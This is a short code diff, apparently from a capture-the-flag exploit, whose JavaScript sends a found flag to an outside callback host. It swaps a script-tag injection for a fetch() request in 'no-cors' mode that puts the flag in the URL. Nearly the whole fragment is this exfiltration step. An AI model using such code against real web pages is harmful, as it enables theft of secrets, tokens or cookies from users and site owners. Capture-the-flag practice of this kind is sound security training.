@@ -28,10 +28,7 @@
 
                 if(b) break;
             }
-            //fetch(`https://${callback}/flag=${flag}`, {method:'get', mode:'no-cors'});
-            const script = document.createElement("script");
-            script.src = `https://${callback}/flag=${flag}`;
-            document.head.appendChild(script);
+            fetch(`https://${callback}/flag=${flag}`, {method:'get', mode:'no-cors'});
         }
 
         getFlag(abc);
